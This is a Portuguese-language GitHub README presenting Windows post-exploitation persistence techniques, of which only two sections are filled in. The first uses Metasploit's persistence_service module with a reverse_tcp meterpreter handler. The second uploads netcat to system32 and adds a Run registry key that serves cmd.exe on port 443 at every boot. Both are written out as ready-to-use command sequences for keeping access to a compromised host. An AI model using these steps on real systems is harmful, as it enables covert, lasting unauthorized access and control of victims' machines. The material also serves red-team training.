# Awesome Windows Persistence

![829c15633cef94444c681910dfedd23b](https://user-images.githubusercontent.com/67444297/198659100-fbdb0b32-38b0-4ff6-a5ab-7ae305cf51cc.gif)

**Técnicas e táticas para manutenção de persistência em um alvo explorado.**

Eu sou o Stux e estarei constantemente atualizando este repositório com novas técnicas para Windows Persistence!

## Sumário
 - [Persistence Service](https://github.com/Stuuxx/awesome-persistence#persistence-service)
 - [Persistence Registry](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#persistence-registry)
 - [Netcat](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#netcat)
 - [RDP](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#rdp)
 - [Schtasks](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#schtasks)
 - [Schtasks-Log Events](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#schtasks-log-events)
 - [WMIC](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#wmic)
 - [Wmi-Persistence](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#wmi-persistence)
 - [SharPersist](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#sharpersist)

### Persistence Service
----------------------------------------------------------------------------------
Já com o alvo explorado e com uma shell meterpreter:
- Colocar a sessão em background;
- Utilizar e configurar o módulo exploit/windows/local/persistence_service do metasploit;

Este módulo irá gerar e fazer upload de um executável para o host explorado, em seguida irá torná-lo um serviço persistente. Ele criará um novo serviço que iniciará a carga útil sempre que o serviço estiver em execução.
**É necessário privilégio de administrador ou de sistema!**
```bash
background
use exploit/windows/local/persistence_service
set SESSION 1
exploit
```
![persistence-service](https://user-images.githubusercontent.com/67444297/198635234-f2d8beb0-a0e3-416f-a1b4-ad49d98448ed.jpg)
- Abrir uma nova aba no terminal;
- Utilizar o multi/handler, configurar-lo e colocar para ouvir;
```bash
msfconsole -q
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
ip a s
set LHOST SEUIP
exploit
```
![persistence-service2](https://user-images.githubusercontent.com/67444297/198635249-b51498b3-7cc6-4cc5-9849-4b143b71e1de.jpg)
Note que logo que você colocar para ouvir o multi/handler, já receberá uma nova shell, isso se da ao fato de que essa técnica é voltada a um serviço persistente, ou seja, está executando o payload diversas vezes enquanto está vivo.

Para prova de conceito, iremos dar um reboot na máquina explorada e aguardar a shell em nosso multi/handler.
![persistence-service3](https://user-images.githubusercontent.com/67444297/198635260-54025d20-366e-4e76-a31e-1731e7da1702.jpg)


### Persistence Registry
----------------------------------------------------------------------------------

### Netcat
----------------------------------------------------------------------------------
Já com o alvo explorado e com uma shell meterpreter:
- Vamos realizar o upload do netcat para algum diretório do alvo.
```bash
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
```
![nc1](https://user-images.githubusercontent.com/67444297/198689309-274f2c78-f4f0-45b0-b2e8-4eb9884615a9.jpg)

- Após realizado o upload, iremos modificar o registro para que o Netcat seja executado.
```bash
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e C:\windows\system32\cmd.exe'
```
![nc2](https://user-images.githubusercontent.com/67444297/198689312-33e81bea-6fec-43e7-bb09-fbe4b3c3bfea.jpg)

- Agora, iremos verificar como ficou nossa modificação.
```bash
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
```
![nc3](https://user-images.githubusercontent.com/67444297/198689313-1abd224e-cd03-4853-9958-65540a2cdb16.jpg)

Para prova de conceito, iremos dar um reboot na máquina explorada para que nosso ataque seja efetivado nos registros do sistema.
![nc4](https://user-images.githubusercontent.com/67444297/198689314-683654df-041d-453d-bec6-be6f419130ec.jpg)

- Após o ataque ser bem sucedido, vamos nos conectar na máquina explorada através do netcat.
```bash
nc IP PORTA
```
![nc5](https://user-images.githubusercontent.com/67444297/198689315-99ce1fe9-5608-4374-b861-b48f09492a57.jpg)


### RDP
----------------------------------------------------------------------------------
Já com o alvo explorado e com uma shell meterpreter:


### Schtasks
----------------------------------------------------------------------------------
Já com o alvo explorado e com uma shell meterpreter:


### Schtasks - Log Events
----------------------------------------------------------------------------------
Já com o alvo explorado e com uma shell meterpreter:


### WMIC
----------------------------------------------------------------------------------
Já com o alvo explorado e com uma shell meterpreter:


### Wmi-Persistence
----------------------------------------------------------------------------------
Já com o alvo explorado e com uma shell meterpreter:


### SharPersist
----------------------------------------------------------------------------------
Já com o alvo explorado e com uma shell meterpreter:




----------------------------------------------------------------------------------
## Ficou com alguma dúvida?
Sinta-se a vontade para entrar em contato comigo através de minhas redes sociais!
 - LinkedIn : [Eduardo Maragno](https://www.linkedin.com/in/eduardo-maragno/)
 - Bugcrowd : [@Stux](https://bugcrowd.com/StuxRs)
 - Medium : [@Stux](https://medium.com/@stux)
 - Twitter : [@StuxRs](https://twitter.com/StuxRs)
